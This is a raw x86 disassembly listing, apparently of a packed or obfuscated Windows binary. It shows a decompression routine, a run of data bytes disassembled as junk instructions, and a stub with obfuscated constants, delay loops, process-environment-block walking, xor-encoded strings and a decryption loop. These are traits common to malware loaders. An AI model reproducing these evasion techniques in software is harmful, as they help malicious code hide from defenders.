  42477d:	jb     0x424782
  42477f:	push   0x3
  424781:	pop    ecx
  424782:	mov    edi,DWORD PTR [ebp-0x38]
  424785:	shl    ecx,0x6
  424788:	sub    eax,eax
  42478a:	inc    eax
  42478b:	push   0x40
  42478d:	pop    esi
  42478e:	lea    edi,[edi+ecx*2+0x360]
  424795:	mov    ebp,edi
  424797:	call   0x4248c8
  42479c:	mov    ecx,eax
  42479e:	sub    ecx,esi
  4247a0:	jb     0x424795
  4247a2:	mov    DWORD PTR [ebp-0x18],ecx
  4247a5:	mov    DWORD PTR [ebp-0x24],ecx
  4247a8:	cmp    ecx,0x4
  4247ab:	jb     0x424820
  4247ad:	mov    esi,ecx
  4247af:	and    DWORD PTR [ebp-0x24],0x1
  4247b3:	shr    esi,1
  4247b5:	or     DWORD PTR [ebp-0x24],0x2
  4247b9:	dec    esi
  4247ba:	cmp    ecx,0xe
  4247bd:	jae    0x4247d8
  4247bf:	mov    eax,0x2af
  4247c4:	sub    eax,ecx
  4247c6:	mov    ecx,esi
  4247c8:	shl    BYTE PTR [ebp-0x24],cl
  4247cb:	add    eax,DWORD PTR [ebp-0x24]
  4247ce:	shl    eax,1
  4247d0:	add    eax,DWORD PTR [ebp-0x38]
  4247d3:	mov    DWORD PTR [ebp-0x34],eax
  4247d6:	jmp    0x424805
  4247d8:	sub    esi,0x4
  4247db:	call   0x424885
  4247e0:	shr    ebx,1
  4247e2:	shl    DWORD PTR [ebp-0x24],1
  4247e5:	cmp    DWORD PTR [ebp-0x20],ebx
  4247e8:	jb     0x4247f0
  4247ea:	inc    DWORD PTR [ebp-0x24]
  4247ed:	sub    DWORD PTR [ebp-0x20],ebx
  4247f0:	dec    esi
  4247f1:	jne    0x4247db
  4247f3:	mov    eax,0x644
  4247f8:	add    eax,DWORD PTR [ebp-0x38]
  4247fb:	mov    DWORD PTR [ebp-0x34],eax
  4247fe:	shl    DWORD PTR [ebp-0x24],0x4
  424802:	push   0x4
  424804:	pop    esi
  424805:	sub    edi,edi
  424807:	inc    edi
  424808:	mov    eax,edi
  42480a:	mov    ebp,DWORD PTR [ebp-0x34]
  42480d:	call   0x4248c8
  424812:	test   al,0x1
  424814:	je     0x424819
  424816:	or     DWORD PTR [ebp-0x24],edi
  424819:	shl    edi,1
  42481b:	dec    esi
  42481c:	jne    0x42480a
  42481e:	jmp    0x424820
  424820:	inc    DWORD PTR [ebp-0x24]
  424823:	mov    ecx,DWORD PTR [ebp-0x1c]
  424826:	add    ecx,0x2
  424829:	mov    edi,DWORD PTR [ebp-0x4]
  42482c:	mov    eax,edi
  42482e:	sub    eax,DWORD PTR [ebp+0x24]
  424831:	cmp    DWORD PTR [ebp-0x24],eax
  424834:	ja     0x424880
  424836:	mov    esi,edi
  424838:	sub    esi,DWORD PTR [ebp-0x24]
  42483b:	mov    edx,DWORD PTR [ebp+0x28]
  42483e:	lods   al,BYTE PTR ds:[esi]
  42483f:	stos   BYTE PTR es:[edi],al
  424840:	cmp    edi,edx
  424842:	jae    0x424847
  424844:	dec    ecx
  424845:	jne    0x42483e
  424847:	mov    DWORD PTR [ebp-0x4],edi
  42484a:	movzx  esi,al
  42484d:	cmp    edi,DWORD PTR [ebp+0x28]
  424850:	jb     0x4245b1
  424856:	call   0x424885
  42485b:	sub    eax,eax
  42485d:	lea    ebp,[esp+0x3c]
  424861:	mov    edx,DWORD PTR [ebp+0x20]
  424864:	mov    esi,DWORD PTR [ebp-0x8]
  424867:	sub    esi,DWORD PTR [ebp+0x18]
  42486a:	mov    DWORD PTR [edx],esi
  42486c:	mov    edx,DWORD PTR [ebp+0x2c]
  42486f:	mov    edi,DWORD PTR [ebp-0x4]
  424872:	sub    edi,DWORD PTR [ebp+0x24]
  424875:	mov    DWORD PTR [edx],edi
  424877:	leave  
  424878:	pop    ebx
  424879:	pop    esi
  42487a:	pop    edi
  42487b:	ret    0x1c
  42487e:	pop    esi
  42487f:	pop    eax
  424880:	sub    eax,eax
  424882:	inc    eax
  424883:	jmp    0x42485d
  424885:	cmp    ebx,0x1000000
  42488b:	jb     0x42488e
  42488d:	ret    
  42488e:	shl    ebx,0x8
  424891:	push   esi
  424892:	mov    esi,DWORD PTR [ebp-0x8]
  424895:	cmp    esi,DWORD PTR [ebp+0x1c]
  424898:	jae    0x42487e
  42489a:	mov    eax,DWORD PTR [ebp-0x20]
  42489d:	shl    eax,0x8
  4248a0:	lods   al,BYTE PTR ds:[esi]
  4248a1:	scas   eax,DWORD PTR es:[edi]
  4248a2:	sahf   
  4248a3:	or     al,0xaf
  4248a5:	pop    esi
  4248a6:	ins    BYTE PTR es:[edi],dx
  4248a7:	add    bl,BYTE PTR [eax-0x3a634149]
  4248ad:	arpl   WORD PTR [eax+edx*4-0x616a66f0],cx
  4248b4:	sub    al,0x95
  4248b6:	nop
  4248b7:	cmp    BYTE PTR [ecx-0x6a739c3b],ah
  4248bd:	sahf   
  4248be:	pushf  
  4248bf:	mov    bh,0x3e
  4248c1:	lods   al,BYTE PTR ds:[esi]
  4248c2:	mov    edi,0x35899e3a
  4248c7:	mov    WORD PTR [edi-0x707661c6],?
  4248cd:	js     0x424858
  4248cf:	mov    DWORD PTR [ecx-0x4806a973],ecx
  4248d5:	mov    edx,0x1a906919
  4248da:	sbb    DWORD PTR [ecx],ecx
  4248dc:	test   eax,0xfa19ba75
  4248e1:	push   esi
  4248e2:	sti    
  4248e3:	mov    bl,0xcd
  4248e5:	mov    BYTE PTR [edx+0x18906919],bl
  4248eb:	test   eax,0x919daab
  4248f0:	mov    bh,0xb8
  4248f2:	lds    esp,FWORD PTR [edi-0x22]
  4248f5:	mov    DWORD PTR [eax+0x47c5b530],edx
  4248fb:	mov    ah,0x6d
  4248fd:	mov    edx,0xe5560919
  424902:	mov    bh,0xf0
  424904:	outs   dx,DWORD PTR ds:[esi]
  424905:	mov    DWORD PTR [ecx-0x4bca7677],ebp
  42490b:	nop
  42490c:	xor    BYTE PTR [ebp-0x764172de],bl
  424912:	xchg   ebp,eax
  424913:	mov    WORD PTR [edi-0x6775e6c6],?
  424919:	nop
  42491a:	xor    al,0x9d
  42491c:	sub    eax,0x350919ba
  424921:	fldenv [esi+0x29]
  424924:	push   ebp
  424925:	add    BYTE PTR [ebx],al
  424927:	rol    BYTE PTR [ebx+0x6c8d01c0],0x24
  42492e:	inc    eax
  42492f:	ret    
  424930:	push   ebp
  424931:	mov    ebp,esp
  424933:	sub    esp,0x12c
  424939:	push   ebx
  42493a:	push   esi
  42493b:	push   edi
  42493c:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  424943:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42494a:	mov    eax,DWORD PTR [ebp+0x8]
  42494d:	mov    DWORD PTR [ebp+0x8],eax
  424950:	mov    ecx,DWORD PTR [ebp-0x10]
  424953:	mov    ebx,0x75108af
  424958:	xor    ecx,ebx
  42495a:	mov    eax,0x3272f6
  42495f:	add    ecx,eax
  424961:	mov    DWORD PTR [ebp-0x2c],ecx
  424964:	mov    ecx,DWORD PTR [ebp-0x10]
  424967:	xor    ecx,ebx
  424969:	add    ecx,eax
  42496b:	mov    DWORD PTR [ebp-0x3c],ecx
  42496e:	mov    ecx,DWORD PTR [ebp-0x10]
  424971:	xor    ecx,ebx
  424973:	add    ecx,eax
  424975:	mov    DWORD PTR [ebp-0x40],ecx
  424978:	mov    ecx,DWORD PTR [ebp-0x10]
  42497b:	xor    ecx,ebx
  42497d:	add    ecx,eax
  42497f:	mov    DWORD PTR [ebp-0xd8],ecx
  424985:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  42498c:	mov    DWORD PTR [ebp-0x40],0xf89cb5a5
  424993:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  42499a:	push   0x25
  42499c:	pop    ecx
  42499d:	mov    DWORD PTR [ebp-0x38],ecx
  4249a0:	mov    DWORD PTR [ebp-0x38],ecx
  4249a3:	push   0x65
  4249a5:	pop    ecx
  4249a6:	mov    DWORD PTR [ebp-0x38],ecx
  4249a9:	mov    DWORD PTR [ebp-0x38],ecx
  4249ac:	mov    DWORD PTR [ebp-0x38],0x4d
  4249b3:	mov    DWORD PTR [ebp-0x38],0x43
  4249ba:	mov    ecx,DWORD PTR [ebp-0x10]
  4249bd:	xor    ecx,ebx
  4249bf:	add    ecx,eax
  4249c1:	mov    DWORD PTR [ebp-0x38],ecx
  4249c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4249c7:	xor    ecx,ebx
  4249c9:	add    ecx,eax
  4249cb:	mov    DWORD PTR [ebp-0x38],ecx
  4249ce:	mov    DWORD PTR [ebp-0x28],0x258
  4249d5:	mov    DWORD PTR [ebp-0x20],0x36
  4249dc:	mov    DWORD PTR [ebp-0x14],0x7a
  4249e3:	lea    edi,[ebp-0x10c]
  4249e9:	lea    esi,[ebp-0x12c]
  4249ef:	call   0x4256b1
  4249f4:	dec    DWORD PTR [ebp-0x14]
  4249f7:	jne    0x4249e3
  4249f9:	dec    DWORD PTR [ebp-0x20]
  4249fc:	jne    0x4249dc
  4249fe:	dec    DWORD PTR [ebp-0x28]
  424a01:	jne    0x4249d5
  424a03:	mov    DWORD PTR [ebp-0x28],0x400e
  424a0a:	mov    eax,DWORD PTR [ebp-0x10]
  424a0d:	xor    eax,ebx
  424a0f:	mov    esi,0x3272f6
  424a14:	add    eax,esi
  424a16:	mov    DWORD PTR [ebp-0x1c],eax
  424a19:	mov    eax,DWORD PTR [ebp-0x10]
  424a1c:	and    DWORD PTR [ebp-0x94],0x0
  424a23:	xor    eax,ebx
  424a25:	add    eax,esi
  424a27:	mov    DWORD PTR [ebp-0x34],eax
  424a2a:	mov    eax,fs:0x18
  424a30:	mov    DWORD PTR [ebp-0x94],eax
  424a36:	mov    eax,DWORD PTR [eax+0x30]
  424a39:	mov    DWORD PTR [ebp-0xcc],eax
  424a3f:	mov    eax,DWORD PTR [eax+0xc]
  424a42:	mov    DWORD PTR [ebp-0xc0],eax
  424a48:	mov    eax,DWORD PTR [ebp+0x8]
  424a4b:	lea    ecx,[ebp-0x94]
  424a51:	mov    DWORD PTR [eax+0x1a0],ecx
  424a57:	mov    eax,DWORD PTR [ebp+0x8]
  424a5a:	lea    ecx,[ebp-0xcc]
  424a60:	mov    DWORD PTR [eax+0x1a4],ecx
  424a66:	mov    eax,DWORD PTR [ebp+0x8]
  424a69:	push   DWORD PTR [ebp+0x8]
  424a6c:	lea    ecx,[ebp-0xc0]
  424a72:	mov    DWORD PTR [eax+0x1a8],ecx
  424a78:	call   0x426e72
  424a7d:	mov    ecx,DWORD PTR [ebp-0x10]
  424a80:	xor    ecx,ebx
  424a82:	add    ecx,esi
  424a84:	cmp    ecx,eax
  424a86:	je     0x424e09
  424a8c:	mov    eax,DWORD PTR [ebp+0x8]
  424a8f:	mov    eax,DWORD PTR [eax+0x194]
  424a95:	mov    ecx,DWORD PTR [eax]
  424a97:	mov    eax,DWORD PTR [ebp+0x8]
  424a9a:	mov    eax,DWORD PTR [eax+0x194]
  424aa0:	mov    eax,DWORD PTR [eax]
  424aa2:	add    eax,DWORD PTR [ecx+0x3c]
  424aa5:	mov    ecx,DWORD PTR [ebp+0x8]
  424aa8:	mov    ecx,DWORD PTR [ecx+0x1e0]
  424aae:	lea    edx,[ebp-0xec]
  424ab4:	push   edx
  424ab5:	mov    edx,DWORD PTR [ebp+0x8]
  424ab8:	mov    edx,DWORD PTR [edx+0x18c]
  424abe:	mov    edx,DWORD PTR [edx]
  424ac0:	add    edx,DWORD PTR [eax+0x88]
  424ac6:	push   0x4
  424ac8:	push   DWORD PTR [eax+0x8c]
  424ace:	push   edx
  424acf:	call   DWORD PTR [ecx+0x1c]
  424ad2:	push   DWORD PTR [ebp+0x8]
  424ad5:	xor    eax,eax
  424ad7:	mov    DWORD PTR [ebp-0xa8],0x1b40103a
  424ae1:	mov    DWORD PTR [ebp-0xa4],0x14371122
  424aeb:	mov    DWORD PTR [ebp-0xa0],0x42111e0c
  424af5:	mov    BYTE PTR [ebp-0x9c],0x83
  424afc:	lea    edi,[ebp-0x9b]
  424b02:	stos   DWORD PTR es:[edi],eax
  424b03:	stos   WORD PTR es:[edi],ax
  424b05:	stos   BYTE PTR es:[edi],al
  424b06:	xor    eax,eax
  424b08:	mov    DWORD PTR [ebp-0xbc],0x1b40103a
  424b12:	mov    DWORD PTR [ebp-0xb8],0x14371122
  424b1c:	mov    DWORD PTR [ebp-0xb4],0x2c111e0c
  424b26:	mov    BYTE PTR [ebp-0xb0],0x83
  424b2d:	lea    edi,[ebp-0xaf]
  424b33:	stos   DWORD PTR es:[edi],eax
  424b34:	stos   WORD PTR es:[edi],ax
  424b36:	stos   BYTE PTR es:[edi],al
  424b37:	mov    edi,DWORD PTR [ebp+0x8]
  424b3a:	mov    eax,DWORD PTR [ebp+0x8]
  424b3d:	mov    edx,DWORD PTR [eax+0x1b8]
  424b43:	mov    DWORD PTR [ebp-0x68],0x110f1017
  424b4a:	mov    DWORD PTR [ebp-0x64],0x1a131620
  424b51:	mov    WORD PTR [ebp-0x60],0x8342
  424b57:	mov    DWORD PTR [ebp-0x90],0x1b40103a
  424b61:	mov    DWORD PTR [ebp-0x8c],0x17421122
  424b6b:	mov    DWORD PTR [ebp-0x88],0x35221b13
  424b75:	mov    DWORD PTR [ebp-0x84],0x111e160e
  424b7f:	mov    DWORD PTR [ebp-0x80],0x8342201a
  424b86:	mov    DWORD PTR [ebp-0x7c],0x1b40103a
  424b8d:	mov    DWORD PTR [ebp-0x78],0x17421122
  424b94:	mov    DWORD PTR [ebp-0x74],0x35221b13
  424b9b:	mov    DWORD PTR [ebp-0x70],0x111e160e
  424ba2:	mov    DWORD PTR [ebp-0x6c],0x832c201a
  424ba9:	call   0x426ea1
  424bae:	push   eax
  424baf:	mov    eax,DWORD PTR [ebp+0x8]
  424bb2:	mov    eax,DWORD PTR [eax+0x1a8]
  424bb8:	push   DWORD PTR [eax]
  424bba:	call   0x426b42
  424bbf:	test   eax,eax
  424bc1:	jne    0x424c13
  424bc3:	mov    eax,DWORD PTR [ebp+0x8]
  424bc6:	mov    eax,DWORD PTR [eax+0x1e0]
  424bcc:	mov    edi,DWORD PTR [ebp+0x8]
  424bcf:	add    eax,0x4
  424bd2:	mov    DWORD PTR [ebp-0x24],eax
  424bd5:	mov    eax,DWORD PTR [ebp+0x8]
  424bd8:	mov    edx,DWORD PTR [eax+0x1b8]
  424bde:	call   0x426ea1
  424be3:	push   eax
  424be4:	mov    eax,DWORD PTR [ebp-0x24]
  424be7:	call   DWORD PTR [eax]
  424be9:	test   eax,eax
  424beb:	jne    0x424c13
  424bed:	mov    eax,DWORD PTR [ebp+0x8]
  424bf0:	mov    eax,DWORD PTR [eax+0x1e0]
  424bf6:	mov    edi,DWORD PTR [ebp+0x8]
  424bf9:	add    eax,0x10
  424bfc:	mov    DWORD PTR [ebp-0x24],eax
  424bff:	mov    eax,DWORD PTR [ebp+0x8]
  424c02:	mov    edx,DWORD PTR [eax+0x1b8]
  424c08:	call   0x426ea1
  424c0d:	push   eax
  424c0e:	mov    eax,DWORD PTR [ebp-0x24]
  424c11:	call   DWORD PTR [eax]
  424c13:	mov    eax,DWORD PTR [ebp-0x10]
  424c16:	mov    ecx,DWORD PTR [ebp-0x28]
  424c19:	xor    eax,ebx
  424c1b:	add    eax,esi
  424c1d:	cmp    eax,ecx
  424c1f:	je     0x424de2
  424c25:	mov    eax,DWORD PTR [ebp-0x18]
  424c28:	xor    eax,ebx
  424c2a:	mov    ecx,0xffcd8d0a
  424c2f:	sub    ecx,eax
  424c31:	add    ecx,DWORD PTR [ebp-0x28]
  424c34:	mov    eax,DWORD PTR [ebp-0x1c]
  424c37:	cmp    eax,ecx
  424c39:	ja     0x424de2
  424c3f:	mov    DWORD PTR [ebp-0x20],0x0
  424c46:	push   DWORD PTR [ebp+0x8]
  424c49:	mov    edi,DWORD PTR [ebp+0x8]
  424c4c:	mov    eax,DWORD PTR [ebp+0x8]
  424c4f:	mov    edx,DWORD PTR [eax+0x1b4]
  424c55:	call   0x426ea1
  424c5a:	push   eax
  424c5b:	mov    eax,DWORD PTR [ebp+0x8]
  424c5e:	mov    eax,DWORD PTR [eax+0x1a8]
  424c64:	push   DWORD PTR [eax]
  424c66:	call   0x426b42
  424c6b:	mov    ecx,DWORD PTR [ebp+0x8]
  424c6e:	mov    ecx,DWORD PTR [ecx+0x19c]
  424c74:	mov    DWORD PTR [ecx],eax
  424c76:	mov    eax,DWORD PTR [ebp+0x8]
  424c79:	mov    edi,DWORD PTR [eax+0x1e0]
  424c7f:	mov    esi,DWORD PTR [ebp+0x8]
  424c82:	xor    eax,eax
  424c84:	lea    edx,[ebp-0x7c]
  424c87:	call   0x426ed7
  424c8c:	push   eax
  424c8d:	mov    eax,DWORD PTR [ebp+0x8]
  424c90:	mov    eax,DWORD PTR [eax+0x19c]
  424c96:	push   DWORD PTR [eax]
  424c98:	call   DWORD PTR [edi+0x8]
  424c9b:	mov    DWORD PTR [ebp-0x24],eax
  424c9e:	mov    eax,DWORD PTR [ebp+0x8]
  424ca1:	mov    edi,DWORD PTR [eax+0x1e0]
  424ca7:	mov    esi,DWORD PTR [ebp+0x8]
  424caa:	xor    eax,eax
  424cac:	lea    edx,[ebp-0x90]
  424cb2:	call   0x426ed7
  424cb7:	push   eax
  424cb8:	mov    eax,DWORD PTR [ebp+0x8]
  424cbb:	mov    eax,DWORD PTR [eax+0x19c]
  424cc1:	push   DWORD PTR [eax]
  424cc3:	call   DWORD PTR [edi+0x8]
  424cc6:	mov    eax,DWORD PTR [ebp+0x8]
  424cc9:	mov    edi,DWORD PTR [eax+0x1e0]
  424ccf:	mov    esi,DWORD PTR [ebp+0x8]
  424cd2:	xor    eax,eax
  424cd4:	lea    edx,[ebp-0xa8]
  424cda:	call   0x426ed7
  424cdf:	push   eax
  424ce0:	mov    eax,DWORD PTR [ebp+0x8]
  424ce3:	mov    eax,DWORD PTR [eax+0x19c]
  424ce9:	push   DWORD PTR [eax]
  424ceb:	call   DWORD PTR [edi+0x8]
  424cee:	and    DWORD PTR [ebp-0x8],0x0
  424cf2:	mov    DWORD PTR [ebp-0x44],eax
  424cf5:	mov    eax,DWORD PTR [ebp-0x8]
  424cf8:	and    eax,0x7
  424cfb:	add    eax,0x31
  424cfe:	push   eax
  424cff:	call   DWORD PTR [ebp-0x24]
  424d02:	test   eax,eax
  424d04:	je     0x424d48
  424d06:	mov    eax,DWORD PTR [ebp-0x8]
  424d09:	push   0x19
  424d0b:	xor    edx,edx
  424d0d:	pop    ecx
  424d0e:	div    ecx
  424d10:	add    dl,0x41
  424d13:	movzx  eax,dl
  424d16:	push   eax
  424d17:	call   DWORD PTR [ebp-0x44]
  424d1a:	test   eax,eax
  424d1c:	jne    0x424d48
  424d1e:	mov    eax,DWORD PTR [ebp+0x8]
  424d21:	mov    edi,DWORD PTR [eax+0x1e0]
  424d27:	mov    esi,DWORD PTR [ebp+0x8]
  424d2a:	xor    eax,eax
  424d2c:	lea    edx,[ebp-0x68]
  424d2f:	call   0x426ed7
  424d34:	push   eax
  424d35:	mov    eax,DWORD PTR [ebp+0x8]
  424d38:	mov    eax,DWORD PTR [eax+0x198]
  424d3e:	push   DWORD PTR [eax]
  424d40:	call   DWORD PTR [edi+0x8]
  424d43:	mov    DWORD PTR [ebp-0x14],eax
  424d46:	jmp    0x424d4c
  424d48:	and    DWORD PTR [ebp-0x14],0x0
  424d4c:	inc    DWORD PTR [ebp-0x8]
  424d4f:	cmp    DWORD PTR [ebp-0x8],0x10
  424d53:	jb     0x424cf5
  424d55:	mov    eax,DWORD PTR [ebp-0x18]
  424d58:	mov    esi,DWORD PTR [ebp+0x8]
  424d5b:	xor    eax,ebx
  424d5d:	mov    edi,0x3272f6
  424d62:	add    eax,edi
  424d64:	lea    edx,[ebp-0x10c]
  424d6a:	call   0x426ed7
  424d6f:	push   eax
  424d70:	mov    eax,DWORD PTR [ebp-0x10]
  424d73:	mov    esi,DWORD PTR [ebp+0x8]
  424d76:	xor    eax,ebx
  424d78:	add    eax,edi
  424d7a:	lea    edx,[ebp-0x12c]
  424d80:	call   0x426ed7
  424d85:	push   eax
  424d86:	call   DWORD PTR [ebp-0x14]
  424d89:	mov    ecx,DWORD PTR [ebp-0x10]
  424d8c:	xor    ecx,ebx
  424d8e:	add    ecx,edi
  424d90:	cmp    ecx,eax
  424d92:	jne    0x424d9b
  424d94:	mov    DWORD PTR [ebp-0x20],0x1
  424d9b:	mov    eax,DWORD PTR [ebp-0x18]
  424d9e:	mov    ecx,DWORD PTR [ebp-0x1c]
  424da1:	xor    eax,ebx
  424da3:	lea    eax,[eax+ecx*1+0x3272f6]
  424daa:	mov    DWORD PTR [ebp-0x1c],eax
  424dad:	mov    eax,DWORD PTR [ebp-0x20]
  424db0:	test   eax,eax
  424db2:	je     0x424dc6
  424db4:	mov    eax,DWORD PTR [ebp-0x18]
  424db7:	mov    ecx,DWORD PTR [ebp-0x34]
  424dba:	xor    eax,ebx
  424dbc:	lea    eax,[eax+ecx*1+0x3272f6]
  424dc3:	mov    DWORD PTR [ebp-0x34],eax
  424dc6:	mov    eax,DWORD PTR [ebp-0x18]
  424dc9:	xor    eax,ebx
  424dcb:	mov    ecx,0xffcd8d0a
  424dd0:	sub    ecx,eax
  424dd2:	add    ecx,DWORD PTR [ebp-0x28]
  424dd5:	mov    eax,DWORD PTR [ebp-0x1c]
  424dd8:	cmp    eax,ecx
  424dda:	jbe    0x424c3f
  424de0:	mov    esi,edi
  424de2:	mov    eax,DWORD PTR [ebp-0x34]
  424de5:	mov    ecx,DWORD PTR [ebp-0x1c]
  424de8:	cmp    ecx,eax
  424dea:	jne    0x424dfd
  424dec:	push   DWORD PTR [ebp+0x8]
  424def:	lea    eax,[ebp-0x3c]
  424df2:	push   eax
  424df3:	call   0x427946
  424df8:	mov    DWORD PTR [ebp-0x2c],eax
  424dfb:	jmp    0x424e09
  424dfd:	mov    eax,DWORD PTR [ebp-0x2c]
  424e00:	mov    ecx,DWORD PTR [ebp-0x18]
  424e03:	xor    ecx,ebx
  424e05:	add    ecx,esi
  424e07:	xor    DWORD PTR [eax],ecx
  424e09:	mov    eax,DWORD PTR [ebp-0x10]
  424e0c:	mov    ecx,DWORD PTR [ebp-0x2c]
  424e0f:	xor    eax,ebx
  424e11:	add    eax,esi
  424e13:	cmp    eax,ecx
  424e15:	je     0x42558f
  424e1b:	mov    eax,DWORD PTR [ebp-0x10]
  424e1e:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e21:	xor    eax,ebx
  424e23:	add    eax,esi
  424e25:	cmp    eax,ecx
  424e27:	je     0x42558f
  424e2d:	mov    eax,DWORD PTR [ebp-0x10]
  424e30:	xor    eax,ebx
  424e32:	add    eax,esi
  424e34:	jmp    0x424e52
  424e36:	mov    edi,DWORD PTR [ebp-0x2c]
  424e39:	mov    cl,al
  424e3b:	and    cl,0x1f
  424e3e:	or     dl,0xff
  424e41:	sub    dl,cl
  424e43:	add    BYTE PTR [edi+eax*1],dl
  424e46:	mov    ecx,DWORD PTR [ebp-0x18]
  424e49:	xor    ecx,ebx
  424e4b:	lea    eax,[eax+ecx*1+0x3272f6]
  424e52:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e55:	cmp    eax,ecx
  424e57:	jb     0x424e36
  424e59:	mov    eax,DWORD PTR [ebp-0x3c]
  424e5c:	mov    DWORD PTR [ebp-0x28],eax
  424e5f:	mov    eax,DWORD PTR [ebp-0x2c]
  424e62:	mov    DWORD PTR [ebp-0x34],0xf89c85a5
  424e69:	mov    DWORD PTR [ebp-0xd4],eax
  424e6f:	mov    edi,0xf89c85a4
  424e74:	mov    DWORD PTR [ebp-0x30],edi
  424e77:	mov    eax,DWORD PTR [ebp-0x34]
  424e7a:	xor    eax,ebx
  424e7c:	add    eax,esi
  424e7e:	mov    DWORD PTR [ebp-0xc],eax
  424e81:	mov    eax,DWORD PTR [ebp-0x34]
  424e84:	xor    eax,ebx
  424e86:	add    eax,esi
  424e88:	mov    DWORD PTR [ebp-0x8],eax
  424e8b:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  424e92:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  424e99:	mov    eax,DWORD PTR [ebp-0x34]
  424e9c:	mov    ecx,DWORD PTR [ebp-0x28]
  424e9f:	xor    eax,ebx
  424ea1:	add    eax,esi
  424ea3:	cmp    ecx,eax
  424ea5:	je     0x4250a4
  424eab:	jmp    0x425080
  424eb0:	mov    ecx,DWORD PTR [ebp-0xc]
  424eb3:	mov    eax,DWORD PTR [ebp-0x28]
  424eb6:	sub    eax,ecx
  424eb8:	mov    ecx,DWORD PTR [ebp-0x44]
  424ebb:	xor    ecx,ebx
  424ebd:	add    ecx,esi
  424ebf:	xor    edx,edx
  424ec1:	div    ecx
  424ec3:	mov    DWORD PTR [ebp-0x8],eax
  424ec6:	mov    eax,DWORD PTR [ebp-0x4c]
  424ec9:	mov    ecx,DWORD PTR [ebp-0x8]
  424ecc:	xor    eax,ebx
  424ece:	add    eax,esi
  424ed0:	cmp    ecx,eax
  424ed2:	jbe    0x424ede
  424ed4:	mov    eax,DWORD PTR [ebp-0x4c]
  424ed7:	xor    eax,ebx
  424ed9:	add    eax,esi
  424edb:	mov    DWORD PTR [ebp-0x8],eax
  424ede:	mov    eax,DWORD PTR [ebp-0x44]
  424ee1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ee4:	xor    eax,ebx
  424ee6:	add    eax,esi
  424ee8:	imul   eax,ecx
  424eeb:	mov    DWORD PTR [ebp-0x8],eax
  424eee:	mov    eax,DWORD PTR [ebp-0x34]
  424ef1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ef4:	xor    eax,ebx
  424ef6:	add    eax,esi
  424ef8:	cmp    ecx,eax
  424efa:	je     0x42506e
  424f00:	mov    eax,DWORD PTR [ebp-0x8]
  424f03:	mov    DWORD PTR [ebp-0x14],eax
  424f06:	mov    eax,DWORD PTR [ebp-0xc]
  424f09:	add    eax,DWORD PTR [ebp-0xd4]
  424f0f:	mov    DWORD PTR [ebp-0x24],0xf89c85a5
  424f16:	mov    DWORD PTR [ebp-0x20],edi
  424f19:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  424f23:	mov    DWORD PTR [ebp-0x8],eax
  424f26:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  424f2d:	mov    DWORD PTR [ebp-0x1c],edi
  424f30:	mov    eax,DWORD PTR [ebp-0x24]
  424f33:	xor    eax,ebx
  424f35:	add    eax,esi
  424f37:	jmp    0x42502d
  424f3c:	mov    DWORD PTR [ebp-0xe0],0xf89c85ba
  424f46:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  424f50:	mov    eax,DWORD PTR [ebp-0x1c]
  424f53:	mov    ecx,DWORD PTR [ebp-0x48]
  424f56:	xor    eax,ebx
  424f58:	add    eax,esi
  424f5a:	imul   eax,ecx
  424f5d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f60:	mov    al,BYTE PTR [eax+ecx*1]
  424f63:	mov    BYTE PTR [ebp-0x2],al
  424f66:	mov    eax,DWORD PTR [ebp-0x1c]
  424f69:	mov    ecx,DWORD PTR [ebp-0x48]
  424f6c:	xor    eax,ebx
  424f6e:	add    eax,esi
  424f70:	imul   eax,ecx
  424f73:	mov    ecx,DWORD PTR [ebp-0xe8]
  424f79:	xor    ecx,ebx
  424f7b:	add    eax,ecx
  424f7d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f80:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424f88:	mov    ecx,DWORD PTR [ebp-0xe0]
  424f8e:	xor    ecx,ebx
  424f90:	lea    eax,[ecx+eax*1+0x3272f6]
  424f97:	movzx  ecx,BYTE PTR [ebp-0x2]
  424f9b:	xor    ecx,eax
  424f9d:	mov    BYTE PTR [ebp-0x2],cl
  424fa0:	mov    al,BYTE PTR [ebp-0x2]
  424fa3:	mov    ecx,DWORD PTR [ebp-0x1c]
  424fa6:	mov    edx,DWORD PTR [ebp-0x48]
  424fa9:	xor    ecx,ebx
  424fab:	add    ecx,esi
  424fad:	imul   ecx,edx
  424fb0:	mov    edx,DWORD PTR [ebp-0x8]
  424fb3:	mov    BYTE PTR [ecx+edx*1],al
  424fb6:	mov    eax,DWORD PTR [ebp-0x1c]
  424fb9:	mov    ecx,DWORD PTR [ebp-0x48]
  424fbc:	xor    eax,ebx
  424fbe:	add    eax,esi
  424fc0:	imul   eax,ecx
  424fc3:	mov    ecx,DWORD PTR [ebp-0x8]
  424fc6:	mov    al,BYTE PTR [eax+ecx*1]
  424fc9:	mov    BYTE PTR [ebp-0x2],al
  424fcc:	mov    eax,DWORD PTR [ebp-0x1c]
  424fcf:	mov    ecx,DWORD PTR [ebp-0x48]
  424fd2:	xor    eax,ebx
  424fd4:	add    eax,esi
  424fd6:	imul   eax,ecx
  424fd9:	mov    ecx,DWORD PTR [ebp-0x20]
  424fdc:	xor    ecx,ebx
  424fde:	add    eax,ecx
  424fe0:	mov    ecx,DWORD PTR [ebp-0x8]
  424fe3:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424feb:	mov    ecx,DWORD PTR [ebp-0xc4]
  424ff1:	xor    ecx,ebx
  424ff3:	lea    eax,[ecx+eax*1+0x3272f6]
  424ffa:	movzx  ecx,BYTE PTR [ebp-0x2]
  424ffe:	xor    ecx,eax
  425000:	mov    BYTE PTR [ebp-0x2],cl
  425003:	mov    al,BYTE PTR [ebp-0x2]
  425006:	mov    ecx,DWORD PTR [ebp-0x1c]
  425009:	mov    edx,DWORD PTR [ebp-0x48]
  42500c:	xor    ecx,ebx
  42500e:	add    ecx,esi
